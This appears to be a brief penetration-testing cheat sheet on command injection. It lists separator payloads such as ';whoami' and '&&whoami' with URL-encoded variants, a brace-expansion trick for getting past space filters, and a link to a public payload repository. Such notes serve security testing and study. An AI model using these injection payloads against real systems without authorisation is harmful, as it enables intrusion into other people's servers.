# command injection


## payloads

Test command with:

    ;whoami - %3bwhoami
    |whoami - %7cwhoami
    &&whoami - %26%26whoami
    \nwhoami - %0awhoami

Bypassing space filters

    ;{ls,-la}

## Resources

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#command-injection